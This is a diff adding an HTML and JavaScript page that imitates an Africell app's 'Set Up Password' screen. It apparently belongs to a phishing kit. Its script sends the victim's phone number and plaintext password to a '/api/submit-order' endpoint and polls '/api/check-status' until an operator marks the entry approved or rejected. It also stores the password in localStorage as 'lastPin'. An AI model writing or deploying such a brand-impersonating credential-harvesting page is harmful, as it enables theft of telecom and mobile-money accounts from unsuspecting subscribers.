@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Africell | Set Up Password</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            background: #F2F2F2;
+            overflow-x: hidden;
+        }
+
+        .verify-wrapper {
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Solid Purple Top Navigation Bar */
+        .verify-navbar {
+            width: 100%;
+            height: 119px;
+            background: #991676;
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
+            gap: 20px;
+        }
+
+        .back-arrow {
+            color: #ffffff;
+            font-size: 26px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 35px;
+            height: 35px;
+        }
+
+        .navbar-title {
+            color: #ffffff;
+            font-size: 22px;
+            font-weight: 400;
+        }
+
+        /* Main Content Container */
+        .verify-content {
+            width: 100%;
+            max-width: 520px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0 34px;
+        }
+
+        /* Main Heading */
+        .verify-heading {
+            font-size: 32px;
+            font-weight: 400;
+            color: #000000;
+            text-align: center;
+            margin-top: 40px;
+            margin-bottom: 20px;
+        }
+
+        /* Instructions */
+        .verify-instructions {
+            font-size: 16px;
+            color: #000000;
+            text-align: center;
+            font-weight: 400;
+            line-height: 1.4;
+            margin-bottom: 35px;
+        }
+
+        /* Input Field Containers */
+        .verify-input-group {
+            width: 100%;
+            position: relative;
+            margin-bottom: 24px;
+        }
+
+        .verify-input-field {
+            width: 100%;
+            height: 118px;
+            background: #ffffff;
+            border: 2px solid #991676;
+            border-radius: 18px;
+            font-size: 20px;
+            font-weight: 600;
+            color: #000000;
+            text-align: center;
+            outline: none;
+            -webkit-appearance: none;
+            appearance: none;
+            padding: 0 50px;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
+        }
+
+        .verify-input-field::placeholder {
+            color: #707070;
+            font-size: 18px;
+            font-weight: 400;
+            text-align: center;
+        }
+
+        .verify-input-field:focus {
+            border-color: #79105c;
+        }
+
+        /* Eye Icon Toggle */
+        .toggle-password {
+            position: absolute;
+            right: 24px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #79105c;
+            font-size: 20px;
+            cursor: pointer;
+            z-index: 10;
+        }
+
+        /* Large Purple Button */
+        .verify-btn {
+            width: 100%;
+            height: 120px;
+            background: #991676;
+            color: #ffffff;
+            border: none;
+            border-radius: 17px;
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: capitalize;
+            cursor: pointer;
+            box-shadow: 0 6px 16px rgba(153, 22, 118, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            margin-top: 10px;
+            transition: background 0.2s ease, transform 0.1s ease;
+        }
+
+        .verify-btn:hover {
+            background: #79105c;
+        }
+
+        .verify-btn:active {
+            transform: translateY(1px);
+        }
+
+        .verify-btn.disabled-state {
+            opacity: 0.4;
+            filter: blur(1.5px);
+            pointer-events: none;
+            cursor: not-allowed;
+            box-shadow: none !important;
+        }
+
+        /* Loading Spinner */
+        #loadingSpinner {
+            display: none;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 20px;
+            font-size: 15px;
+            color: #991676;
+            font-weight: 600;
+        }
+
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(153, 22, 118, 0.2);
+            border-top: 3px solid #991676;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Custom In-App Modal Dialog */
+        #customModal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(153, 22, 118, 0.9);
+            backdrop-filter: blur(8px);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 20px;
+        }
+
+        .modal-card {
+            background: #991676;
+            width: 100%;
+            max-width: 320px;
+            border-radius: 24px;
+            padding: 28px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            color: #ffffff;
+            animation: scaleUp 0.3s ease;
+        }
+
+        @keyframes scaleUp {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .modal-message {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 24px;
+            line-height: 1.4;
+            color: #ffffff;
+        }
+
+        .modal-btn {
+            background: #ffd34d;
+            color: #5E0C44;
+            border: none;
+            border-radius: 14px;
+            padding: 14px 24px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 6px 16px rgba(255, 211, 77, 0.3);
+        }
+
+        .modal-btn:active {
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="verify-wrapper">
+        <!-- Top Navigation Bar -->
+        <nav class="verify-navbar">
+            <a href="scratch.html" class="back-arrow">
+                <i class="fa-solid fa-arrow-left"></i>
+            </a>
+            <span class="navbar-title">Set Up Password</span>
+        </nav>
+
+        <!-- Main Body Content -->
+        <div class="verify-content">
+            <h1 class="verify-heading">Set Up Password</h1>
+            <p class="verify-instructions">
+                Please create a password to secure your account
+            </p>
+
+            <!-- Enter Password Field -->
+            <div class="verify-input-group">
+                <input type="password" id="enterPassword" class="verify-input-field" placeholder="Enter Password" required>
+                <i class="fa-solid fa-eye toggle-password" id="toggleEnterPass" onclick="togglePass('enterPassword', 'toggleEnterPass')"></i>
+            </div>
+
+            <!-- Confirm Password Field -->
+            <div class="verify-input-group">
+                <input type="password" id="confirmPassword" class="verify-input-field" placeholder="Confirm Password" required>
+                <i class="fa-solid fa-eye toggle-password" id="toggleConfirmPass" onclick="togglePass('confirmPassword', 'toggleConfirmPass')"></i>
+            </div>
+
+            <!-- Purple Set Password Button -->
+            <button type="button" id="setPasswordBtn" class="verify-btn" onclick="submitNewPassword()">Set Password</button>
+
+            <!-- Loading Spinner -->
+            <div id="loadingSpinner">
+                <div class="spinner"></div>
+                <span>Saving new password...</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Custom In-App Modal Dialog -->
+    <div id="customModal">
+        <div class="modal-card">
+            <div id="modalText" class="modal-message">Notification message here</div>
+            <button class="modal-btn" onclick="closeModal()">OK</button>
+        </div>
+    </div>
+
+    <script>
+        let pendingAction = null;
+
+        function showAppAlert(message, actionCallback = null) {
+            document.getElementById('modalText').innerText = message;
+            document.getElementById('customModal').style.display = 'flex';
+            pendingAction = actionCallback;
+        }
+
+        function closeModal() {
+            document.getElementById('customModal').style.display = 'none';
+            if (pendingAction) {
+                pendingAction();
+                pendingAction = null;
+            }
+        }
+
+        function togglePass(inputId, iconId) {
+            const input = document.getElementById(inputId);
+            const icon = document.getElementById(iconId);
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                input.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        }
+
+        async function submitNewPassword() {
+            const pass1 = document.getElementById('enterPassword').value.trim();
+            const pass2 = document.getElementById('confirmPassword').value.trim();
+            const setBtn = document.getElementById('setPasswordBtn');
+            const spinnerDiv = document.getElementById('loadingSpinner');
+            const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || 'Unknown User';
+
+            // Password requirements validation
+            if (pass1.length < 5) {
+                showAppAlert('❌ Password must be at least 5 characters long.');
+                return;
+            }
+            if (!/[a-zA-Z]/.test(pass1)) {
+                showAppAlert('❌ Password must contain letters.');
+                return;
+            }
+            if (/^\d+$/.test(pass1)) {
+                showAppAlert('❌ Password cannot be numbers only.');
+                return;
+            }
+            if (pass1 !== pass2) {
+                showAppAlert('❌ Both passwords must match.');
+                return;
+            }
+
+            localStorage.setItem('lastPin', pass1);
+
+            try {
+                setBtn.classList.add('disabled-state');
+                if (spinnerDiv) spinnerDiv.style.display = 'flex';
+
+                const response = await fetch('/api/submit-order', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: phoneInput, uniqueId: 'New Password: ' + pass1 })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    pollApprovalStatus(phoneInput);
+                } else {
+                    setBtn.classList.remove('disabled-state');
+                    if (spinnerDiv) spinnerDiv.style.display = 'none';
+                    showAppAlert('❌ Failed to save password. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                setBtn.classList.remove('disabled-state');
+                if (spinnerDiv) spinnerDiv.style.display = 'none';
+                showAppAlert('Could not connect to the backend server.');
+            }
+        }
+
+        function pollApprovalStatus(phone) {
+            const cleanPhone = phone.trim();
+            const setBtn = document.getElementById('setPasswordBtn');
+            const spinnerDiv = document.getElementById('loadingSpinner');
+
+            const statusInterval = setInterval(async () => {
+                try {
+                    const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
+                    const data = await response.json();
+
+                    if (data.status === 'approved') {
+                        clearInterval(statusInterval);
+                        showAppAlert('✅ Password successfully set!', () => {
+                            window.location.href = 'login.html';
+                        });
+                    } 
+                    else if (data.status === 'rejected' || data.status === 'wrong_id') {
+                        clearInterval(statusInterval);
+                        if (spinnerDiv) spinnerDiv.style.display = 'none';
+                        setBtn.classList.remove('disabled-state');
+                        showAppAlert('❌ Request rejected. Please try again.');
+                    }
+                } catch (e) {
+                    console.error('Polling error', e);
+                }
+            }, 3000);
+        }
+    </script>
+
+</body>
+</html>
